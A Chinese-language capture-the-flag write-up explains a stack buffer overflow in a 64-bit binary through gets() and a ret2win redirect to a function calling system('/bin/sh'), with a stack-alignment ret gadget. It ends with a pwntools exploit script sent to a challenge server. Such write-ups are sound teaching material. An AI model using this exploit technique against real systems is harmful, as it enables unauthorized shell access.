用 `file` 查看一下文件的基础信息
![[Pasted image 20240414220747.png]]
64 位的文件
用 `checksec` 检查一下保护措施
![[Pasted image 20240414220824.png]]
只开启了 NX 保护
直接 `gdb` 调试，`start` 后直接用 `layout asm` 看汇编代码。可以直接看到 `main` 函数的汇编代码
![[Pasted image 20240414221007.png]]
前三个都无关紧要，主要关注 `0x4006fc` 之后的代码。
`call 0x400560` 调用 `puts` 函数，参数为 `rdi` 处的内容，即 `0x4007a7` 处存储的内容。
用 `x/s 0x4007a7` 查看字符串
![[Pasted image 20240414221243.png]]

`call 0x400580` 调用 `gets` 函数，前三行是处理它的参数。`gets` 函数没有限制输入的数量，可以看到栈空间的大小为 0x30，即只需覆盖 0x38 即可覆盖整个栈

接着在附近（准确来说在上面）找到 `system` 函数
![[Pasted image 20240414221028.png]]
用 `x/s 0x4007a4` 查看字符串（如果不是 `\bin\sh` 这样的话还要构造字符串）
![[Pasted image 20240414221154.png]]
直接调用 `try_to_call_me` 函数即可解决（但是函数名称就很明显了吧）
但是需要注意的是这里需要平衡堆栈（关于栈对齐可以看这个[栈对齐](https://zhuanlan.zhihu.com/p/611961995)）
如果直接用这个脚本
![[Pasted image 20240414222719.png]]
`pwntools` 会报错 `Got EOF while sending in interactive`
![[Pasted image 20240414222734.png]]
也即需要满足 16 Byte，而目标函数 `try_to_call_me` 地址占据 8 字节，前面输入了 0x30 个输入，即 48 字节，故还需要 8 字节填充 payload，所以添加一个 `ret` 汇编代码的地址（占 8 字节）
所以最终脚本为
```
from pwn import *
r = remote("47.99.166.89", 10267)
p1 = b'a' * 0x30 + b'b' * 8 + p64(0x40071f) + p64(0x00400687)
r.sendline(p1)
r.interactive()
```
即可获得 `flag`
![[Pasted image 20240414223536.png]]